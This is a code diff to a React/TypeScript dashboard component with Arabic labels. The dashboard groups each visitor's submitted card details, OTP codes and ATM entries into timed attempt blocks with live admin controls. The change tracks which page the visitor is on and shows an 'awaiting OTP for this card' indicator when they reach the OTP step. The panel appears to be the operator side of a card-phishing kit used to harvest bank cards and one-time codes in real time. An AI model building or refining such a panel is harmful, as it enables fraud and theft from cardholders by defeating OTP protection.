@@ -54,6 +54,7 @@ interface AttemptBlock {
   otp?: SubmissionRow;
   atm?: SubmissionRow;
   isActive: boolean;
+  waitingForAdmin?: boolean;
 }
 
 const ATTEMPT_GAP_MS = 10 * 60 * 1000; // 10 minutes gap to split attempts
@@ -291,13 +292,13 @@ function AttemptBlockCard({
   onControl,
   loadingAction,
   isLatest,
-  showOtpPlaceholder,
+  currentPage,
 }: {
   block: AttemptBlock;
   onControl: (action: string) => Promise<void>;
   loadingAction: string | null;
   isLatest: boolean;
-  showOtpPlaceholder?: boolean;
+  currentPage?: string;
 }) {
   const cardData = block.card ? parseData(block.card.data) : null;
   const otpData = block.otp ? parseData(block.otp.data) : null;
@@ -309,6 +310,13 @@ function AttemptBlockCard({
 
   // Live counter for block start time
   const liveTimeText = useLiveCounter(block.startTime);
+
+  // Check if user is on an OTP page
+  const isOnOtpPage = currentPage && (
+    currentPage.includes('الرمز') || 
+    currentPage.includes('OTP') ||
+    currentPage.includes('التحقق')
+  );
 
   return (
     <div className={`rounded-3xl border p-4 ${block.isActive ? "border-green-300 bg-green-50/50" : "border-slate-200 bg-white"}`}>
@@ -371,10 +379,16 @@ function AttemptBlockCard({
           <span className="text-xs text-blue-600 mt-1 block">{formatAgo(block.atm.createdAt)}</span>
         </div>
       ) : isLatest && block.card ? (
-        // Smart visibility: Only show placeholder for latest attempt with card but no OTP
-        <div className="rounded-2xl border border-dashed border-orange-200 bg-orange-50/50 p-4 mb-3 text-center">
-          <span className="text-sm text-orange-600">⏳ بانتظار إدخال رمز OTP لهذه البطاقة...</span>
-        </div>
+        // Smart visibility: Only show placeholder when user is on an OTP page
+        isOnOtpPage ? (
+          <div className="rounded-2xl border border-dashed border-orange-200 bg-orange-50/50 p-4 mb-3 text-center animate-pulse">
+            <span className="text-sm text-orange-600">⏳ بانتظار إدخال رمز OTP لهذه البطاقة...</span>
+          </div>
+        ) : (
+          <div className="rounded-2xl border border-slate-100 bg-slate-50 p-3 mb-3 text-xs text-slate-400 text-center">
+            لم يتم إدخال رمز OTP
+          </div>
+        )
       ) : (
         <div className="rounded-2xl border border-slate-100 bg-slate-50 p-3 mb-3 text-xs text-slate-400 text-center">
           لم يتم إدخال رمز OTP
@@ -542,6 +556,7 @@ function SessionBox({
                     onControl={handleControl}
                     loadingAction={loadingAction}
                     isLatest={index === 0}
+                    currentPage={currentPage}
                   />
                 ))}
               </div>
